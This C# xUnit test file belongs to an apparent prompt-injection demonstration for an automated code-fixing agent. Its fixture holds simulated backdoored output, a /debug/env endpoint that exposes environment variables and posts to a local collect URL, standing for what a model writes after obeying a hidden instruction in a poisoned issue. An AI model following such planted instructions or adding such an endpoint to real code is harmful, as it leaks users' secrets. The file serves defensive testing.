using AutoFixAgent;
using Xunit;

namespace AutoFixAgent.Tests;

public class FakeModelClient : IModelClient
{
    public string? LastSystemPrompt { get; private set; }
    public string? LastUserPrompt { get; private set; }
    public string ResponseToReturn { get; set; } = "";

    public Task<string> CompleteAsync(string systemPrompt, string userPrompt)
    {
        LastSystemPrompt = systemPrompt;
        LastUserPrompt = userPrompt;
        return Task.FromResult(ResponseToReturn);
    }
}

/// <summary>
/// The simulated backdoored file content that a "helpful" model would produce after complying
/// with the poisoned issue's hidden instruction. Shared between <see cref="PatchGeneratorTests"/>
/// (proves the agent pipeline reproduces this content) and
/// <see cref="AttackPayloadReachesScannerTests"/> (proves the actual Defense scanner catches it) -
/// kept as a single source of truth so the two tests can't silently drift apart.
/// </summary>
public static class BackdooredContentFixture
{
    public static string Build() => string.Join("\n", new[]
    {
        "app.MapGet(\"/users/{id}\", (string id) => UsersEndpoint.HandleGetUser(userService, id));",
        "app.MapGet(\"/debug/env\", () => {",
        "    var vars = Environment.GetEnvironmentVariables();",
        "    using var client = new HttpClient();",
        "    client.PostAsync(\"http://localhost:4000/collect\", null);",
        "    return Results.Ok(vars);",
        "});",
    });
}

public class PatchGeneratorTests
{
    [Fact]
    public async Task PassesTheIssueBodyAndCurrentFileContentToTheModel()
    {
        var fakeModel = new FakeModelClient { ResponseToReturn = "// fixed content" };

        await PatchGenerator.GenerateFixedFileAsync(fakeModel, "issue body text", "original file content");

        Assert.Contains("issue body text", fakeModel.LastUserPrompt);
        Assert.Contains("original file content", fakeModel.LastUserPrompt);
    }

    [Fact]
    public async Task ReturnsTheModelsResponseAsTheFixedFileContent()
    {
        var fakeModel = new FakeModelClient { ResponseToReturn = "// fixed content" };

        var result = await PatchGenerator.GenerateFixedFileAsync(fakeModel, "issue body text", "original file content");

        Assert.Equal("// fixed content", result);
    }

    [Fact]
    public async Task ReproducesTheBackdoorWhenGivenThePoisonedIssueFixture()
    {
        var dir = AppContext.BaseDirectory;
        while (!Directory.Exists(Path.Combine(dir, "examples")))
        {
            dir = Directory.GetParent(dir)!.FullName;
        }
        var poisonedIssueBody = File.ReadAllText(Path.Combine(dir, "examples", "poisoned-issue.md"));

        // A model that "helpfully" follows the hidden instruction: this simulates what the real
        // Bedrock-backed model does live, without needing real credentials for the automated suite.
        var backdooredContent = BackdooredContentFixture.Build();
        var fakeModel = new FakeModelClient { ResponseToReturn = backdooredContent };

        var result = await PatchGenerator.GenerateFixedFileAsync(fakeModel, poisonedIssueBody, "original file content");

        Assert.Contains("/debug/env", result);
        Assert.Contains("Environment.GetEnvironmentVariables", result);
        Assert.Contains("HttpClient", result);
    }
}
